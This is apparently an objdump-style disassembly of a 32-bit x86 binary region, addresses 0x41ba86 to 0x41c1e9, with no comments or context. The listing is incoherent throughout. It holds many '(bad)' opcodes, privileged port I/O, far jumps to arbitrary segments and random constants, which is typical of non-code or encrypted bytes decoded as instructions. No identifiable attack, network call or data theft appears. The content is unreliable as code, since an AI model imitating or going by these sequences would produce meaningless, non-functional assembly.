  41ba86:	xchg   BYTE PTR ds:0xf7244026,bl
  41ba8c:	int    0xac
  41ba8e:	lahf   
  41ba8f:	lahf   
  41ba90:	cdq    
  41ba91:	mov    edi,0x9194b2df
  41ba96:	mov    edx,0xcfb38828
  41ba9b:	pusha  
  41ba9c:	int3   
  41ba9d:	in     eax,dx
  41ba9e:	sbb    al,0xcd
  41baa0:	cli    
  41baa1:	add    al,0xb3
  41baa3:	mov    WORD PTR [edx+ebp*4+0x4c],es
  41baa7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41baa8:	mov    ecx,0xaf195589
  41baad:	adc    al,0xab
  41baaf:	or     ch,ch
  41bab1:	sub    DWORD PTR [edi-0x5a],edx
  41bab4:	mov    esp,0xcdee0cd5
  41bab9:	mov    eax,ds:0xa28923ac
  41babe:	daa    
  41babf:	mov    al,ds:0x610bb672
  41bac4:	mov    eax,0x3f18e59b
  41bac9:	sub    eax,edi
  41bacb:	icebp  
  41bacc:	test   DWORD PTR [ecx+eiz*1],ebx
  41bacf:	cmp    BYTE PTR [ebp+0x5c498051],dh
  41bad5:	in     al,dx
  41bad6:	xchg   DWORD PTR [edx+ecx*2-0x47],edi
  41bada:	and    esi,DWORD PTR cs:0x3fb09011
  41bae1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bae2:	ja     0x41baae
  41bae4:	pop    ebx
  41bae5:	lods   eax,DWORD PTR ds:[esi]
  41bae6:	aad    0x7e
  41bae8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bae9:	sahf   
  41baea:	add    DWORD PTR [ebx],ebx
  41baec:	std    
  41baed:	jne    0x41bb13
  41baef:	pop    eax
  41baf0:	xchg   BYTE PTR [esi+0xdb5fddb],bl
  41baf6:	sub    eax,0x7f3cb790
  41bafb:	clc    
  41bafc:	cwde   
  41bafd:	ficom  WORD PTR [eax+esi*2]
  41bb00:	jmp    0x41bb1d
  41bb02:	repz xchg ebx,eax
  41bb04:	popf   
  41bb05:	cmp    eax,0xad04eb34
  41bb0a:	xchg   ecx,eax
  41bb0b:	loope  0x41baa2
  41bb0d:	mov    edi,0x9caaaa65
  41bb12:	fmul   DWORD PTR [ebx]
  41bb14:	inc    eax
  41bb15:	out    0x21,al
  41bb17:	adc    bh,BYTE PTR [edi]
  41bb19:	aaa    
  41bb1a:	push   cs
  41bb1b:	out    0xa,al
  41bb1d:	jns    0x41bad0
  41bb1f:	scas   al,BYTE PTR es:[edi]
  41bb20:	aam    0x73
  41bb22:	test   al,cl
  41bb24:	adc    eax,DWORD PTR [edi+ebp*4-0xd]
  41bb28:	cmp    al,0xe2
  41bb2a:	(bad)  [edi]
  41bb2c:	jae    0x41bb02
  41bb2e:	repz es loopne 0x41bb31
  41bb32:	(bad)  
  41bb33:	bound  edi,QWORD PTR [esi]
  41bb35:	leave  
  41bb36:	sbb    BYTE PTR [eax],al
  41bb38:	sbb    BYTE PTR [edx+0x77],0xc6
  41bb3c:	push   edx
  41bb3d:	mov    ebp,0x25a1d01
  41bb42:	mov    al,ds:0xe57b0e5d
  41bb47:	aas    
  41bb48:	push   esi
  41bb49:	or     bh,BYTE PTR [ebx-0x78]
  41bb4c:	sub    DWORD PTR [ebx+0x12],ebx
  41bb4f:	imul   edi,DWORD PTR [ebp+0x5e8203d],0x68
  41bb56:	aad    0xd3
  41bb58:	mov    dh,0x46
  41bb5a:	pop    esi
  41bb5b:	nop
  41bb5c:	sbb    eax,0x339e03c3
  41bb61:	call   0xf26:0xda43c7be
  41bb68:	and    al,0x8
  41bb6a:	xchg   esi,eax
  41bb6b:	rol    BYTE PTR [ebx],1
  41bb6d:	popf   
  41bb6e:	adc    eax,0x327ed816
  41bb73:	lods   al,BYTE PTR ds:[esi]
  41bb74:	clc    
  41bb75:	xchg   esp,eax
  41bb76:	xchg   ecx,eax
  41bb77:	ss push ecx
  41bb79:	sub    eax,0xf0e985ed
  41bb7e:	push   esp
  41bb7f:	sub    al,BYTE PTR ds:0xb9ab7381
  41bb85:	inc    edi
  41bb86:	scas   eax,DWORD PTR es:[edi]
  41bb87:	mov    edi,0x4289ceed
  41bb8c:	bound  ecx,QWORD PTR [ebp-0x2c9c427c]
  41bb92:	cmp    bh,BYTE PTR [ecx-0x20]
  41bb95:	dec    ebx
  41bb96:	pop    eax
  41bb97:	xchg   BYTE PTR [eax+ebx*2],ah
  41bb9a:	mov    eax,0x8ac23dc9
  41bb9f:	mov    bl,0x23
  41bba1:	xor    DWORD PTR [esi],esp
  41bba3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bba4:	retf   
  41bba5:	pop    esi
  41bba6:	mov    al,ds:0xb54e874
  41bbab:	inc    edx
  41bbac:	xchg   esi,eax
  41bbad:	leave  
  41bbae:	add    DWORD PTR [ecx-0x5b43a0c9],edx
  41bbb4:	xchg   esi,eax
  41bbb5:	push   ebx
  41bbb6:	mov    bl,0x59
  41bbb8:	push   edi
  41bbb9:	push   edi
  41bbba:	(bad)  [ecx+0x756f7ad7]
  41bbc0:	int    0x8b
  41bbc2:	cmp    ebp,DWORD PTR [esp+esi*8+0xb29ee60]
  41bbc9:	and    al,0x2d
  41bbcb:	pop    ss
  41bbcc:	and    BYTE PTR [edi+0xf477738],al
  41bbd2:	jg     0x41bbec
  41bbd4:	sar    DWORD PTR [ebx-0x4983ba5e],0x17
  41bbdb:	mov    dh,0x4d
  41bbdd:	adc    ah,BYTE PTR [eax]
  41bbdf:	ins    BYTE PTR es:[edi],dx
  41bbe0:	mov    ds:0x14096c5a,eax
  41bbe5:	sub    BYTE PTR [edi-0x1a502a53],dl
  41bbeb:	enter  0xec8f,0x70
  41bbef:	sub    al,0xbe
  41bbf1:	inc    ebx
  41bbf2:	pop    ds
  41bbf3:	aas    
  41bbf4:	and    DWORD PTR [ebx+0x710dc683],edx
  41bbfa:	sbb    eax,0x2559e2d8
  41bbff:	sub    eax,0xbc3ec6e1
  41bc04:	and    eax,0x92b38bd6
  41bc09:	push   ebx
  41bc0a:	out    0x9,al
  41bc0c:	jns    0x41bbb6
  41bc0e:	in     eax,dx
  41bc0f:	mov    al,ds:0x322d2f75
  41bc14:	cld    
  41bc15:	(bad)  
  41bc16:	adc    al,0x2a
  41bc18:	lock hlt 
  41bc1a:	push   edi
  41bc1b:	add    DWORD PTR [esi+0x5de0d392],edi
  41bc21:	add    DWORD PTR [edi-0x38421934],ebp
  41bc27:	cwde   
  41bc28:	jmp    0x41bbba
  41bc2a:	inc    edi
  41bc2b:	test   BYTE PTR [ecx+0x36de640b],bh
  41bc31:	paddb  mm4,QWORD PTR [eax+eax*2+0x50cef716]
  41bc39:	inc    ebx
  41bc3a:	ret    0x14e
  41bc3d:	fadd   st,st(7)
  41bc3f:	fsubrp st(7),st
  41bc41:	loopne 0x41bca1
  41bc43:	outs   dx,DWORD PTR ds:[esi]
  41bc44:	cmp    edx,DWORD PTR [esi-0x6a]
  41bc47:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41bc49:	xchg   bl,al
  41bc4b:	adc    al,0xb0
  41bc4d:	xchg   ebp,eax
  41bc4e:	idiv   dh
  41bc50:	cmp    BYTE PTR [ecx],ah
  41bc52:	repnz fsubr DWORD PTR [eax+0x579a1a8a]
  41bc59:	jns    0x41bc7b
  41bc5b:	sub    eax,0x28660fd3
  41bc60:	jnp    0x41bc08
  41bc62:	sub    ebx,ebp
  41bc64:	lea    ebp,[ebp+0x481b335]
  41bc6a:	jp     0x41bc2c
  41bc6c:	mov    ds:0x18e97be2,al
  41bc71:	fwait
  41bc72:	ins    BYTE PTR es:[edi],dx
  41bc73:	or     eax,edi
  41bc75:	je     0x41bcad
  41bc77:	xchg   ecx,eax
  41bc78:	in     eax,0x2e
  41bc7a:	inc    ebx
  41bc7b:	(bad)  
  41bc7c:	push   ebx
  41bc7d:	in     eax,0xa6
  41bc7f:	addr16 retf 0xcedc
  41bc83:	sahf   
  41bc84:	inc    edi
  41bc85:	add    BYTE PTR [edi-0x68731d97],bh
  41bc8b:	xchg   esp,eax
  41bc8c:	xor    bl,BYTE PTR [edx-0x5a]
  41bc8f:	sub    al,0x55
  41bc91:	sbb    DWORD PTR [ecx+0x3525adda],0xffffffef
  41bc98:	mov    ecx,0x2269ea82
  41bc9d:	jmp    0x41bcd9
  41bc9f:	test   eax,0x5c8f8888
  41bca4:	mov    ah,0xcd
  41bca6:	mov    BYTE PTR [edi],ah
  41bca8:	pusha  
  41bca9:	push   es
  41bcaa:	pop    edx
  41bcab:	lds    edi,FWORD PTR [edx-0x4e]
  41bcae:	push   ecx
  41bcaf:	add    BYTE PTR [edi+ebp*4+0x51b5c6f3],bl
  41bcb6:	js     0x41bcf9
  41bcb8:	js     0x41bc7e
  41bcba:	ret    0x86fe
  41bcbd:	leave  
  41bcbe:	in     al,dx
  41bcbf:	xor    eax,0xddf58c82
  41bcc4:	pusha  
  41bcc5:	out    0x1c,eax
  41bcc7:	sbb    al,0x0
  41bcc9:	jo     0x41bd30
  41bccb:	and    al,0x54
  41bccd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bcce:	js     0x41bc63
  41bcd0:	and    eax,0x3f8a4020
  41bcd5:	loop   0x41bc7a
  41bcd7:	enter  0x737e,0x37
  41bcdb:	adc    bl,BYTE PTR [esi-0x7f194122]
  41bce1:	ja     0x41bd42
  41bce3:	aas    
  41bce4:	fs push esp
  41bce6:	adc    edi,0x54a49d30
  41bcec:	mov    ds:0xd283f04,eax
  41bcf1:	dec    edx
  41bcf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bcf3:	lahf   
  41bcf4:	ins    BYTE PTR es:[edi],dx
  41bcf5:	dec    ecx
  41bcf6:	pop    edx
  41bcf7:	add    al,BYTE PTR [edx-0x1a879398]
  41bcfd:	enter  0x2269,0x4e
  41bd01:	xchg   edi,eax
  41bd02:	xor    ecx,DWORD PTR [edx+0x28]
  41bd05:	int3   
  41bd06:	fsub   DWORD PTR [ebx-0x61]
  41bd09:	xchg   ebx,eax
  41bd0a:	fcmovnb st,st(3)
  41bd0c:	das    
  41bd0d:	jbe    0x41bcb1
  41bd0f:	mov    ebp,0x5be0961d
  41bd14:	out    0x83,eax
  41bd16:	mov    edx,0x3992433
  41bd1b:	fdivr  QWORD PTR [esp+edi*8-0x7e]
  41bd1f:	push   esp
  41bd20:	ret    0x794
  41bd23:	pop    esp
  41bd24:	fnstenv [ebp+0x2f]
  41bd27:	jmp    0xc4a2:0xc4087f18
  41bd2e:	mov    ebp,esi
  41bd30:	adc    DWORD PTR [ecx-0x7],esp
  41bd33:	or     BYTE PTR [esi-0x69856f49],0xb1
  41bd3a:	imul   ebp,esi,0xffffff98
  41bd3d:	sar    dh,cl
  41bd3f:	scas   eax,DWORD PTR es:[edi]
  41bd40:	test   DWORD PTR [edi+ebp*1+0x297d8249],0x1c9b2981
  41bd4b:	mov    ch,0xd4
  41bd4d:	pop    ebx
  41bd4e:	imul   edi,DWORD PTR [ebp-0x11dc2c13],0xa20dfeeb
  41bd58:	cs fstp st(0)
  41bd5b:	mov    bh,0x57
  41bd5d:	or     al,0x28
  41bd5f:	mov    eax,ds:0x288f05f6
  41bd64:	jp     0x41bd88
  41bd66:	sti    
  41bd67:	fmul   st(1),st
  41bd69:	inc    ebp
  41bd6a:	(bad)  
  41bd6b:	jae    0x41bdcf
  41bd6d:	fisubr DWORD PTR [ebp-0x3016c47f]
  41bd73:	int    0xef
  41bd75:	adc    al,0x3e
  41bd77:	mov    ss,ecx
  41bd79:	push   edi
  41bd7a:	dec    ebx
  41bd7b:	ja     0x41bd26
  41bd7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd7e:	and    DWORD PTR [edi-0x37e43244],esi
  41bd84:	add    edi,esp
  41bd86:	mov    al,0xaf
  41bd88:	adc    dh,dh
  41bd8a:	xchg   edx,eax
  41bd8b:	hlt    
  41bd8c:	or     eax,0x943db9d4
  41bd91:	mov    ah,0x3d
  41bd93:	jbe    0x41bde0
  41bd95:	pop    edi
  41bd96:	arpl   ax,ax
  41bd98:	out    0x97,al
  41bd9a:	imul   esp,eax,0x1d
  41bd9d:	add    DWORD PTR [edi-0x11],eax
  41bda0:	stos   DWORD PTR es:[edi],eax
  41bda1:	shl    BYTE PTR [ecx+0x2abd2474],1
  41bda7:	jecxz  0x41be14
  41bda9:	push   esp
  41bdaa:	imul   esp,DWORD PTR [edx],0xd003f6ed
  41bdb0:	xor    BYTE PTR [bp+si],dl
  41bdb3:	inc    eax
  41bdb4:	mov    al,0xef
  41bdb6:	push   ebx
  41bdb7:	adc    eax,esi
  41bdb9:	in     al,dx
  41bdba:	or     esi,DWORD PTR [ebx-0xb]
  41bdbd:	(bad)  
  41bdbe:	mov    bh,0x32
  41bdc0:	mov    al,0x2d
  41bdc2:	mov    WORD PTR [edi],gs
  41bdc4:	jmp    0x4cde:0xf4fb61ae
  41bdcb:	dec    eax
  41bdcc:	stc    
  41bdcd:	add    al,0x0
  41bdcf:	clc    
  41bdd0:	std    
  41bdd1:	xor    DWORD PTR [esi],esi
  41bdd3:	add    edi,DWORD PTR [esi]
  41bdd5:	clc    
  41bdd6:	mov    eax,0x87be62e
  41bddb:	div    DWORD PTR [esi-0x4887a64f]
  41bde1:	sub    al,BYTE PTR [ebx+0x76a5c970]
  41bde7:	inc    esi
  41bde8:	scas   eax,DWORD PTR es:[edi]
  41bde9:	mov    al,ds:0x4c8602ad
  41bdee:	imul   edi,DWORD PTR [edx],0xffffff83
  41bdf1:	add    dh,BYTE PTR [ecx+0x541070cb]
  41bdf7:	push   esi
  41bdf8:	wbinvd 
  41bdfa:	test   DWORD PTR [ecx+ebp*2+0x6],eax
  41bdfe:	test   al,0xd1
  41be00:	adc    ah,bl
  41be02:	popf   
  41be03:	aad    0xf3
  41be05:	adc    eax,0x392ae82c
  41be0a:	rcl    dl,0xbd
  41be0d:	xchg   BYTE PTR [eax+0x33079bc7],bl
  41be13:	ret    
  41be14:	aad    0xe0
  41be16:	or     bh,BYTE PTR [edi+ecx*1-0x5a4bb4b5]
  41be1d:	fwait
  41be1e:	mov    ebp,0x8a39b42d
  41be23:	xor    ah,BYTE PTR [esi+0x3eee807a]
  41be29:	dec    esi
  41be2a:	fbstp  TBYTE PTR [ebx]
  41be2c:	jns    0x41bdff
  41be2e:	dec    esi
  41be2f:	rcr    BYTE PTR [ecx+0x25],cl
  41be32:	ds jge 0x41beb4
  41be35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be36:	or     edi,DWORD PTR [edi-0x4eb1414d]
  41be3c:	fbstp  TBYTE PTR [eax+ebp*1-0x7a]
  41be40:	daa    
  41be41:	cmc    
  41be42:	cmp    ch,0x0
  41be45:	lods   al,BYTE PTR ds:[esi]
  41be46:	pop    es
  41be47:	(bad)  
  41be48:	int    0xe8
  41be4a:	jge    0x41be06
  41be4c:	ds and eax,0x7a08d738
  41be52:	repnz pushf 
  41be54:	dec    esi
  41be55:	mov    ah,0xe3
  41be57:	cmc    
  41be58:	scas   al,BYTE PTR es:[edi]
  41be59:	outs   dx,BYTE PTR ds:[esi]
  41be5a:	retf   
  41be5b:	test   DWORD PTR [edi],edi
  41be5d:	inc    edx
  41be5e:	xchg   edi,eax
  41be5f:	mov    cl,BYTE PTR [edi]
  41be61:	dec    ebx
  41be62:	cwde   
  41be63:	test   eax,0xe6082a1a
  41be68:	stos   DWORD PTR es:[edi],eax
  41be69:	adc    al,BYTE PTR [esi+esi*8+0x7d945044]
  41be70:	fwait
  41be71:	pop    ebx
  41be72:	aaa    
  41be73:	je     0x41bea0
  41be75:	retf   0x38d9
  41be78:	dec    esp
  41be79:	fisubr WORD PTR [edx-0x29]
  41be7c:	cmp    DWORD PTR [edi+edi*8-0x64f95508],edi
  41be83:	dec    edi
  41be84:	out    dx,al
  41be85:	dec    edi
  41be86:	stos   DWORD PTR es:[edi],eax
  41be87:	pop    esi
  41be88:	lods   al,BYTE PTR ds:[esi]
  41be89:	sub    bh,dh
  41be8b:	jp     0x41be49
  41be8d:	dec    ecx
  41be8e:	js     0x41be57
  41be90:	addr16 dec ebx
  41be92:	loopne 0x41bebe
  41be94:	and    ebp,DWORD PTR [esi-0x59]
  41be97:	cmp    DWORD PTR [ebx-0x2],edi
  41be9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be9b:	cmp    bh,BYTE PTR [esi+0x27164191]
  41bea1:	retf   0xa307
  41bea4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bea5:	mov    ah,0xad
  41bea7:	cmp    BYTE PTR [eax-0x2453c504],ah
  41bead:	xchg   ecx,eax
  41beae:	cmc    
  41beaf:	bound  esi,QWORD PTR [esi]
  41beb1:	jg     0x41be8e
  41beb3:	mov    WORD PTR [ebx],cs
  41beb5:	inc    edx
  41beb6:	dec    ebp
  41beb7:	and    eax,0x97370bc5
  41bebc:	adc    BYTE PTR [ecx-0x46],ch
  41bebf:	dec    edx
  41bec0:	ss xchg ebx,eax
  41bec2:	pusha  
  41bec3:	lds    ebx,FWORD PTR [edx-0xb9e1b17]
  41bec9:	ss dec ebx
  41becb:	push   edi
  41becc:	fistp  QWORD PTR ds:0x66d1dcb8
  41bed2:	imul   esp,ecx,0x2e82e649
  41bed8:	pop    edx
  41bed9:	pop    ecx
  41beda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bedb:	outs   dx,BYTE PTR ds:[esi]
  41bedc:	loopne 0x41bec6
  41bede:	mov    ds:0x85c984f5,al
  41bee3:	pop    eax
  41bee4:	xchg   esi,eax
  41bee5:	mov    ebx,0xe4d6b231
  41beea:	int3   
  41beeb:	mov    ds:0xd0fb451f,eax
  41bef0:	inc    eax
  41bef1:	(bad)  
  41bef2:	int3   
  41bef3:	and    esi,DWORD PTR [ebx+edx*4-0x72a0eb60]
  41befa:	adc    eax,0x3580e0af
  41beff:	cld    
  41bf00:	adc    bh,ch
  41bf02:	push   ebp
  41bf03:	xchg   esi,eax
  41bf04:	idiv   BYTE PTR [edi+eax*2+0x1636ccf3]
  41bf0b:	jae    0x41beaa
  41bf0d:	cs jnp 0x41bec3
  41bf10:	sub    cl,0x4
  41bf13:	and    eax,esp
  41bf15:	in     eax,dx
  41bf16:	ins    DWORD PTR es:[edi],dx
  41bf17:	sbb    dl,BYTE PTR [eax]
  41bf19:	ins    DWORD PTR es:[edi],dx
  41bf1a:	and    BYTE PTR [edi+0x5b07e7b5],dh
  41bf20:	pop    ds
  41bf21:	pop    ss
  41bf22:	cmc    
  41bf23:	cli    
  41bf24:	pop    edx
  41bf25:	arpl   dx,dx
  41bf27:	xor    DWORD PTR [esi],ebp
  41bf29:	inc    esp
  41bf2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf2b:	aaa    
  41bf2c:	fbstp  TBYTE PTR [esi-0xcbbb6b0]
  41bf32:	std    
  41bf33:	sbb    al,0x74
  41bf35:	call   0x426a:0xa8964d1e
  41bf3c:	clc    
  41bf3d:	push   ecx
  41bf3e:	fdivr  st,st(7)
  41bf40:	mov    esp,0x5d9e5181
  41bf45:	dec    eax
  41bf46:	xor    BYTE PTR [esi],dl
  41bf48:	pop    eax
  41bf49:	ss ss ret 
  41bf4c:	mov    bl,0x4e
  41bf4e:	clc    
  41bf4f:	cmp    ebp,DWORD PTR [edx-0x54548736]
  41bf55:	mov    ds,ebp
  41bf57:	fwait
  41bf58:	push   ebp
  41bf59:	into   
  41bf5a:	in     eax,dx
  41bf5b:	push   0x51ad3fe5
  41bf60:	clc    
  41bf61:	shr    DWORD PTR ds:0x37a06c89,0x81
  41bf68:	int    0x4d
  41bf6a:	leave  
  41bf6b:	fwait
  41bf6c:	aaa    
  41bf6d:	(bad)  [eax-0x15]
  41bf70:	mov    esi,0xfee2f5ee
  41bf75:	dec    edx
  41bf76:	cs jnp 0x41bf82
  41bf79:	jecxz  0x41bf08
  41bf7b:	jmp    0x41bfa7
  41bf7d:	sub    cl,bh
  41bf7f:	lods   eax,DWORD PTR ds:[esi]
  41bf80:	xchg   edi,eax
  41bf81:	xor    DWORD PTR fs:[ebp-0x55162149],esp
  41bf88:	pop    eax
  41bf89:	loop   0x41bf79
  41bf8b:	cmp    esi,edi
  41bf8d:	lods   al,BYTE PTR ds:[esi]
  41bf8e:	test   eax,0xa6a437d
  41bf93:	addr16 push eax
  41bf95:	hlt    
  41bf96:	cmp    DWORD PTR [eax+0x5770e81c],0xffffff86
  41bf9d:	mul    DWORD PTR [edi+0x41f00388]
  41bfa3:	stos   BYTE PTR es:[edi],al
  41bfa4:	mov    edx,DWORD PTR [ecx+eax*1-0x39]
  41bfa8:	dec    esp
  41bfa9:	ret    
  41bfaa:	xlat   BYTE PTR ds:[ebx]
  41bfab:	icebp  
  41bfac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bfad:	mov    BYTE PTR [edi-0x72],dl
  41bfb0:	fdivr  QWORD PTR [ebx-0x5b721efd]
  41bfb6:	test   DWORD PTR [edx+ebp*4-0x8],0xb3c29d87
  41bfbe:	cmp    al,0xbc
  41bfc0:	mov    esi,0x9de99244
  41bfc5:	rcl    DWORD PTR [ebp-0x43],1
  41bfc8:	out    dx,eax
  41bfc9:	daa    
  41bfca:	jo     0x41bfaa
  41bfcc:	sub    ebx,DWORD PTR [ebx]
  41bfce:	popf   
  41bfcf:	dec    eax
  41bfd0:	jnp    0x41c04a
  41bfd2:	xor    eax,eax
  41bfd4:	(bad)  
  41bfd5:	repnz fimul WORD PTR [ebx+0x5d]
  41bfd9:	mov    ah,0x4c
  41bfdb:	mov    ds:0x1d48fd80,al
  41bfe0:	shl    BYTE PTR [edx-0x4d34a51f],1
  41bfe6:	loopne 0x41bfdc
  41bfe8:	inc    edi
  41bfe9:	inc    eax
  41bfea:	dec    ebx
  41bfeb:	sub    al,0xb2
  41bfed:	inc    esp
  41bfee:	(bad)  
  41bff0:	jae    0x41c050
  41bff2:	sub    ax,sp
  41bff5:	inc    ecx
  41bff6:	adc    esi,DWORD PTR ds:0x2a26ffda
  41bffc:	std    
  41bffd:	push   edi
  41bffe:	or     al,0x74
  41c000:	ja     0x41bfae
  41c002:	cmp    bh,BYTE PTR [edx]
  41c004:	xchg   ecx,eax
  41c005:	push   0x20
  41c007:	fidiv  WORD PTR [esi]
  41c009:	pop    es
  41c00a:	push   0x1037f629
  41c00f:	jle    0x41c057
  41c011:	mov    ah,0x3b
  41c013:	adc    dl,BYTE PTR ds:0x1b1cf69b
  41c019:	retf   0x1b24
  41c01c:	lss    edx,FWORD PTR [ecx-0x3ee3b0d7]
  41c023:	cmp    DWORD PTR [ecx-0x3aa5ccd8],ebp
  41c029:	cwde   
  41c02a:	es stc 
  41c02c:	test   al,0x63
  41c02e:	push   0x4a
  41c030:	(bad)  
  41c032:	pop    esi
  41c033:	push   esp
  41c034:	fstp   DWORD PTR [edi+0x8]
  41c037:	sub    al,0xbb
  41c039:	jmp    0xea23189f
  41c03e:	mov    al,ds:0xa680f6e
  41c043:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c044:	mov    edi,0x81017ddb
  41c049:	jb     0x41c0bb
  41c04b:	in     al,dx
  41c04c:	push   0x6e
  41c04e:	imul   edx,DWORD PTR ds:0x5cd03a8c,0xa6e0b9c7
  41c058:	inc    esp
  41c059:	repnz (bad) 
  41c05c:	(bad)  
  41c05d:	aas    
  41c05e:	push   ecx
  41c05f:	xor    eax,DWORD PTR [ecx]
  41c061:	ret    0xbb67
  41c064:	ret    0x181e
  41c067:	mov    ds:0x25d7e65b,eax
  41c06c:	in     al,0x6a
  41c06e:	clc    
  41c06f:	loop   0x41c067
  41c071:	jno    0x41c0b0
  41c073:	ror    BYTE PTR [esi+0x79],0x2e
  41c077:	mov    ebx,0xf807dcf1
  41c07c:	mov    ebp,0x2305b1e
  41c081:	push   ss
  41c082:	fstp   DWORD PTR [ebp+0xd28a453]
  41c088:	dec    ecx
  41c089:	xchg   esi,eax
  41c08a:	daa    
  41c08b:	rcl    dl,cl
  41c08d:	cmp    eax,DWORD PTR [esi]
  41c08f:	fisub  DWORD PTR [esi-0x79c02f6b]
  41c095:	push   edx
  41c096:	xlat   BYTE PTR ds:[ebx]
  41c097:	pop    ss
  41c098:	neg    BYTE PTR [ebx+0x52]
  41c09b:	mov    esi,esi
  41c09d:	dec    edx
  41c09e:	cdq    
  41c09f:	inc    ebp
  41c0a0:	sti    
  41c0a1:	mov    bh,ah
  41c0a3:	stos   BYTE PTR es:[edi],al
  41c0a4:	xor    BYTE PTR [edx+0x14c4eb2f],dl
  41c0aa:	leave  
  41c0ab:	(bad)  
  41c0ac:	retf   
  41c0ad:	pusha  
  41c0ae:	pop    eax
  41c0af:	mov    eax,0x7f7a49e6
  41c0b4:	cld    
  41c0b5:	dec    ecx
  41c0b6:	lods   al,BYTE PTR ds:[esi]
  41c0b7:	push   0x6c
  41c0b9:	ins    BYTE PTR es:[edi],dx
  41c0ba:	out    dx,eax
  41c0bb:	xor    al,0x62
  41c0bd:	mov    ecx,0xa604259d
  41c0c2:	bound  edi,QWORD PTR [edx-0x2]
  41c0c5:	cli    
  41c0c6:	int3   
  41c0c7:	push   ds
  41c0c8:	and    edx,DWORD PTR [edx+0x44]
  41c0cb:	adc    esi,DWORD PTR [edx]
  41c0cd:	in     al,dx
  41c0ce:	push   ecx
  41c0cf:	out    dx,eax
  41c0d0:	sub    DWORD PTR [ebx-0x29dbfcc9],ebp
  41c0d6:	mov    cl,0xae
  41c0d8:	imul   edi,DWORD PTR [ebx-0x7c9ae423],0xffffffd5
  41c0df:	jmp    0xf905:0xea41179e
  41c0e6:	add    DWORD PTR [ecx+0x5a1c804d],edx
  41c0ec:	or     al,0x95
  41c0ee:	pop    ss
  41c0ef:	or     BYTE PTR [esi-0x45a919d1],cl
  41c0f5:	push   0xffffff83
  41c0f7:	out    dx,eax
  41c0f8:	dec    ecx
  41c0f9:	out    dx,eax
  41c0fa:	loopne 0x41c07d
  41c0fc:	out    0x7b,al
  41c0fe:	div    DWORD PTR [edx+ebx*8+0x4b]
  41c102:	shr    BYTE PTR [edi+0x6c],0x77
  41c106:	cmp    eax,DWORD PTR [ebx+0x59229b69]
  41c10c:	mov    BYTE PTR [ebx+0x2a430a64],0xb3
  41c113:	sub    eax,DWORD PTR [esp+eax*1-0x7d]
  41c117:	jbe    0x41c0eb
  41c119:	dec    ebp
  41c11a:	or     al,0xc4
  41c11c:	out    0xf1,eax
  41c11e:	fsub   DWORD PTR [eax-0x73]
  41c121:	pushf  
  41c122:	ss repnz push ds
  41c125:	neg    DWORD PTR gs:[ebx+eiz*2-0x123d6383]
  41c12d:	arpl   WORD PTR ds:0x7bbc876,bx
  41c133:	stos   DWORD PTR es:[edi],eax
  41c134:	jo     0x41c187
  41c136:	lods   al,BYTE PTR ds:[esi]
  41c137:	hlt    
  41c138:	imul   edx,esp,0x637bf8b8
  41c13e:	and    eax,0xb64bc248
  41c143:	(bad)  
  41c144:	cmp    al,0x31
  41c146:	ja     0x41c153
  41c148:	scas   al,BYTE PTR es:[edi]
  41c149:	inc    ebx
  41c14a:	not    bh
  41c14c:	ss pop es
  41c14e:	fdivr  st,st(3)
  41c150:	push   0x4c3c1836
  41c155:	sbb    ebx,DWORD PTR [edx+0x7056c42a]
  41c15b:	pushf  
  41c15c:	pop    edx
  41c15d:	in     al,0x3f
  41c15f:	mov    edx,0x13ebd808
  41c165:	mov    ebp,0x25dfa566
  41c16a:	in     al,dx
  41c16b:	std    
  41c16c:	or     BYTE PTR [ecx-0x4c57edb1],bh
  41c172:	mov    WORD PTR [edi+0x76],cs
  41c175:	or     ebp,eax
  41c177:	or     al,0x9b
  41c179:	into   
  41c17a:	js     0x41c1ef
  41c17c:	out    dx,al
  41c17d:	pop    edi
  41c17e:	pop    eax
  41c17f:	or     DWORD PTR [edx],esi
  41c181:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c182:	sbb    esp,DWORD PTR cs:0xde70e9e7
  41c189:	mov    cl,0x23
  41c18b:	ret    0x3c7f
  41c18e:	and    cl,BYTE PTR [edi]
  41c190:	aaa    
  41c191:	xor    BYTE PTR [esi],dl
  41c193:	fcom   DWORD PTR [esi+ecx*8]
  41c196:	push   es
  41c197:	adc    edx,DWORD PTR [edx+eax*8]
  41c19a:	jle    0x41c14d
  41c19c:	into   
  41c19d:	retf   0xec40
  41c1a0:	fistp  DWORD PTR [ebx+0x3b]
  41c1a3:	push   ecx
  41c1a4:	mov    ebx,ss
  41c1a6:	leave  
  41c1a7:	or     eax,0xbe1fd8ec
  41c1ac:	mov    dh,0x4d
  41c1ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1af:	lea    ebx,[ecx+0x3f]
  41c1b2:	mov    dh,0xd8
  41c1b4:	mov    ds:0x795b1333,al
  41c1b9:	pop    eax
  41c1ba:	or     ebp,DWORD PTR [ebx]
  41c1bc:	or     al,0x3f
  41c1be:	jmp    0x865c:0xef321964
  41c1c5:	dec    ebx
  41c1c6:	mov    cl,0x74
  41c1c8:	inc    esi
  41c1c9:	jg     0x41c1f8
  41c1cb:	inc    esp
  41c1cc:	push   esp
  41c1cd:	mov    edx,0x32342f0a
  41c1d2:	pop    ds
  41c1d3:	in     eax,dx
  41c1d4:	xor    BYTE PTR [esi+0x21fb714],ch
  41c1da:	sahf   
  41c1db:	cmp    bl,BYTE PTR [ebp+0x49]
  41c1de:	xor    ah,BYTE PTR [eax-0x6844920]
  41c1e4:	fwait
  41c1e5:	enter  0xe757,0x83
  41c1e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
